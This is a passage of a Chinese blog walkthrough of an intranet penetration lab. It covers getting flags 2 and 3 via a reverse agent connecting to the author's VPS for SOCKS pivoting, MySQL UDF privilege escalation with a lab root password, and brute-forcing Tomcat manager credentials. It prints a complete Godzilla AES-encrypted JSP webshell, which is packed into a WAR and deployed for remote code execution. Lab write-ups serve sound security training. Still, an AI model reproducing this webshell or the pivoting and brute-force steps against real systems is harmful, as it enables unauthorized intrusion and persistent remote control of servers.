+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191614446.png" srcset="/img/loading.gif" lazyload alt="image-20260324191614446"></p>
+<p>然后在蚁剑的终端建立与自己的云服务器的反向连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./linux_x64_agent -c [VPS-IP]:9999<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191616898.png" srcset="/img/loading.gif" lazyload alt="image-20260324191616898"></p>
+<p>这里没有权限，ok很熟悉了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x ./linux_x64_agent<br></code></pre></td></tr></table></figure>
+
+<p>然后再执行一次上面的命令</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191619158.png" srcset="/img/loading.gif" lazyload alt="image-20260324191619158"></p>
+<p>这样就成功了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">detail<br>use 0<br>socks 15000<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191623633.png" srcset="/img/loading.gif" lazyload alt="image-20260324191623633"></p>
+<p>然后在proxifier上配置好后接受15000端口的流量</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191625726.png" srcset="/img/loading.gif" lazyload alt="image-20260324191625726"></p>
+<p>然后就可以访问内网了</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191627885.png" srcset="/img/loading.gif" lazyload alt="image-20260324191627885"></p>
+<p>这里拿到了mysql的密码，可以先利用MDUT看一下mysql服务</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mysql</span> <span class="hljs-number">10.10.20.166:3306</span>:root <span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+
+<p>在新增中添加</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191630215.png" srcset="/img/loading.gif" lazyload alt="image-20260324191630215"></p>
+<p>连接成功后，保存添加然后打开，进行UDF提权</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191632585.png" srcset="/img/loading.gif" lazyload alt="image-20260324191632585"></p>
+<p>发现没有找到flag，可以尝试用find命令找到flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -<span class="hljs-built_in">type</span> f -name <span class="hljs-string">&quot;*flag*&quot;</span> 2&gt;/dev/null<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191635569.png" srcset="/img/loading.gif" lazyload alt="image-20260324191635569"></p>
+<p>ok直接读取flag2.txt拿到第二个flag</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191638473.png" srcset="/img/loading.gif" lazyload alt="image-20260324191638473"></p>
+<p>flag2{530ee2980a42a42bf5ef25954a6fa7fb}</p>
+<h1 id="flag3（Tomcat-8-0-43弱口令爆破-后台getshell）"><a href="#flag3（Tomcat-8-0-43弱口令爆破-后台getshell）" class="headerlink" title="flag3（Tomcat&#x2F;8.0.43弱口令爆破+后台getshell）"></a>flag3（Tomcat&#x2F;8.0.43弱口令爆破+后台getshell）</h1><p>依旧是这个Apache Tomcat&#x2F;8.0.43，可以在网上找到已有的存在的漏洞<img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191641273.png" srcset="/img/loading.gif" lazyload alt="image-20260324191641273"></p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191643546.png" srcset="/img/loading.gif" lazyload alt="image-20260324191643546"></p>
+<p>这里需要登录，可以尝试bp抓包爆破</p>
+<p>这里要注意的是要关掉Proxifier，先填写下面的代理主机和端口，再勾选使用socks代理</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191646154.png" srcset="/img/loading.gif" lazyload alt="image-20260324191646154"></p>
+<p>在登录页面输入111:111进行抓包，是在Authorization处进行身份验证，可以对其进行爆破，看到验证位置存在三个变量，我们这里对每一个变量的payload都采用自定义迭代器</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191648691.png" srcset="/img/loading.gif" lazyload alt="image-20260324191648691"></p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191651344.png" srcset="/img/loading.gif" lazyload alt="image-20260324191651344"></p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191654974.png" srcset="/img/loading.gif" lazyload alt="image-20260324191654974"></p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191657274.png" srcset="/img/loading.gif" lazyload alt="image-20260324191657274"></p>
+<p>添加payload处理规则，与原值一样进行base64编码</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191659941.png" srcset="/img/loading.gif" lazyload alt="image-20260324191659941"></p>
+<p>不能再勾选url编码</p>
+<p>爆破成功了</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191703720.png" srcset="/img/loading.gif" lazyload alt="image-20260324191703720"></p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191705995.png" srcset="/img/loading.gif" lazyload alt="image-20260324191705995"></p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">账户：tomcat<br><br>密码：tomact123<br></code></pre></td></tr></table></figure>
+
+<p>成功进入了&#x2F;manager&#x2F;html，看到有地方可以上传war包</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191708131.png" srcset="/img/loading.gif" lazyload alt="image-20260324191708131"></p>
+<blockquote>
+<p>这里要补充一下war包的制作</p>
+</blockquote>
+<p><strong>war包制作</strong></p>
+<p>先创建一个jsp文件（我是用哥斯拉生成的，也可以网上找</p>
+<p>密码是pass</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%! String xc=<span class="hljs-string">&quot;3c6e0b8a9c15224a&quot;</span>; String pass=<span class="hljs-string">&quot;pass&quot;</span>; String md5=md5(pass+xc); <span class="hljs-keyword">class</span> <span class="hljs-title class_">X</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ClassLoader</span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-title function_">X</span><span class="hljs-params">(ClassLoader z)</span>&#123;<span class="hljs-built_in">super</span>(z);&#125;<span class="hljs-keyword">public</span> Class <span class="hljs-title function_">Q</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] cb)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.defineClass(cb, <span class="hljs-number">0</span>, cb.length);&#125; &#125;<span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] x(<span class="hljs-type">byte</span>[] s,<span class="hljs-type">boolean</span> m)&#123; <span class="hljs-keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);c.init(m?<span class="hljs-number">1</span>:<span class="hljs-number">2</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="hljs-string">&quot;AES&quot;</span>));<span class="hljs-keyword">return</span> c.doFinal(s); &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>; &#125;&#125; <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">md5</span><span class="hljs-params">(String s)</span> &#123;<span class="hljs-type">String</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="hljs-string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="hljs-number">0</span>, s.length());ret = <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.math.BigInteger(<span class="hljs-number">1</span>, m.digest()).toString(<span class="hljs-number">16</span>).toUpperCase();&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<span class="hljs-keyword">return</span> ret; &#125; <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Encode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bs)</span> <span class="hljs-keyword">throws</span> Exception &#123;Class base64;<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;base64=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);value = (String)Encoder.getClass().getMethod(<span class="hljs-string">&quot;encodeToString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; <span class="hljs-type">byte</span>[].class &#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-keyword">try</span> &#123; base64=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>); <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; <span class="hljs-type">byte</span>[].class &#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="hljs-keyword">return</span> value; &#125; <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] base64Decode(String bs) <span class="hljs-keyword">throws</span> Exception &#123;Class base64;<span class="hljs-type">byte</span>[] value = <span class="hljs-literal">null</span>;<span class="hljs-keyword">try</span> &#123;base64=Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);value = (<span class="hljs-type">byte</span>[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-keyword">try</span> &#123; base64=Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>); <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.newInstance(); value = (<span class="hljs-type">byte</span>[])decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class &#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="hljs-keyword">return</span> value; &#125;%&gt;&lt;%<span class="hljs-keyword">try</span>&#123;<span class="hljs-type">byte</span>[] data=base64Decode(request.getParameter(pass));data=x(data, <span class="hljs-literal">false</span>);<span class="hljs-keyword">if</span> (session.getAttribute(<span class="hljs-string">&quot;payload&quot;</span>)==<span class="hljs-literal">null</span>)&#123;session.setAttribute(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">X</span>(<span class="hljs-built_in">this</span>.getClass().getClassLoader()).Q(data));&#125;<span class="hljs-keyword">else</span>&#123;request.setAttribute(<span class="hljs-string">&quot;parameters&quot;</span>,data);java.io.ByteArrayOutputStream arrOut=<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(<span class="hljs-string">&quot;payload&quot;</span>)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(<span class="hljs-number">0</span>,<span class="hljs-number">16</span>));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="hljs-literal">true</span>)));response.getWriter().write(md5.substring(<span class="hljs-number">16</span>));&#125; &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后利用jar将其打包为war</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\Java\jdk1.8.0_151\bin\jar.exe cvf shell1.war shell1.jsp<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191714445.png" srcset="/img/loading.gif" lazyload alt="image-20260324191714445"></p>
+<blockquote>
+<p>这里有个疑问是要两个文件名相同吗，一开始用的是1.war但传了之后不管访问哪个文件名都是403</p>
+</blockquote>
+<p>这样就好了，访问<code>http://10.10.20.88:8080/shell1/shell1.jsp</code>(这个目录和文件名一致就行)</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191716574.png" srcset="/img/loading.gif" lazyload alt="image-20260324191716574"></p>
+<p>这样子就ok了，这里的jsp是用哥斯拉生成的，就也用哥斯拉连接了（当然蚁剑和冰蝎应该也可以，但是木马可能要改一下</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191719563.png" srcset="/img/loading.gif" lazyload alt="image-20260324191719563"></p>
+<p>连接成功后添加，找一下flag文件</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -type f -name <span class="hljs-string">&quot;*flag*&quot;</span> <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191722056.png" srcset="/img/loading.gif" lazyload alt="image-20260324191722056"></p>
+<p>好像不太行，那就换一个</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -name *flag*<br></code></pre></td></tr></table></figure>
+
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191724426.png" srcset="/img/loading.gif" lazyload alt="image-20260324191724426"></p>
+<p>ok拿到第三个flag</p>
+<p><img src="/2026/03/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/image-20260324191728805.png" srcset="/img/loading.gif" lazyload alt="image-20260324191728805"></p>
+<p>flag3{8bc05b8ba01d357a44d42b7b16ce7a58}</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F/" class="category-chain-item">渗透</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E6%B8%97%E9%80%8F/%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/" class="category-chain-item">综合靶场</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>内网渗透靶场1</div>
+      <div>https://colourful228.github.io/2026/03/19/内网渗透靶场/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Colourful</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年3月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年3月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/03/19/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Phar反序列化">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Phar反序列化</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/03/10/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化">
+                        <span class="hidden-mobile">pickle反序列化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://imagegoo-twikoo.hf.space","region":"ap-shanghai","path":"window.location.pathname"},
+          {
+            el: '#twikoo',
+            path: 'window.location.pathname',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+    <div>
+        <span id="timeDate">正在载入天数...</span>
+        <span id="times">载入时分秒...</span>
+        <script>
+          var now = new Date();
+          function createtime(){
+            var grt= new Date("01/09/2026 00:00:00");
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24;
+            dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+            hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){
+              hnum = "0" + hnum;
+            }
+            minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes);
+            if(String(mnum).length ==1 ){
+              mnum = "0" + mnum;
+            }
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds);
+            if(String(snum).length ==1 ){
+              snum = "0" + snum;
+            }
+            document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";
+            document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+          }
+          setInterval("createtime()",250);
+        </script>
+    </div>
+
+
+
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  var relativeDate = function() {
+    var updatedTime = document.getElementById('updated-time');
+    if (updatedTime) {
+      var text = updatedTime.textContent;
+      var reg = /\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:Z|[+-]\d{2}:\d{2})/;
+      var matchs = text.match(reg);
+      if (matchs) {
+        var relativeTime = moment(matchs[0]).fromNow();
+        updatedTime.textContent = text.replace(reg, relativeTime);
+      }
+      updatedTime.style.display = '';
+    }
+  };
+  Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/moment.min.js', function() {
+    if (!'zh-cn'.startsWith('en')) {
+      Fluid.utils.createScript('https://lib.baomitu.com/moment.js/2.29.4/locale/zh-cn.min.js', function() {
+        relativeDate();
+      });
+    } else {
+      relativeDate();
+    }
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<!-- hexo injector body_end start --><script src="/js/backgroundize.js"></script><!-- hexo injector body_end end --></body>
+</html>
